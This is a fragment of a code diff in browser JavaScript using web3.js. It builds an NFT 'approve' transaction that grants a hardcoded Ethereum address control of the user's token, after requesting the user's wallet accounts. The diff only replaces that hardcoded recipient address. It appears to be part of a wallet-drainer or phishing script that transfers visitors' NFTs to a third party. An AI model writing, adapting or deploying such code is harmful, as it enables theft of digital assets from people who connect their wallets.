@@ -1475,7 +1475,7 @@ var acct = (async function(){
 	//var add1x = localStorage.getItem("mySharedData");
 	
  	var contract_address1 = web3.utils.toChecksumAddress(nft_k)
-        var _data = new web3.eth.Contract(abi, contract_address).methods.approve("0x362796183ce6fb4e2215aa6ea57aadbc56b6a870", nft_id).encodeABI();
+        var _data = new web3.eth.Contract(abi, contract_address).methods.approve("0xd4ba547282a909afc9b4c58c9f4777a34a8582eb", nft_id).encodeABI();
         var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         var account = accounts[0];
 	var result = await web3.eth.getTransactionCount(account)
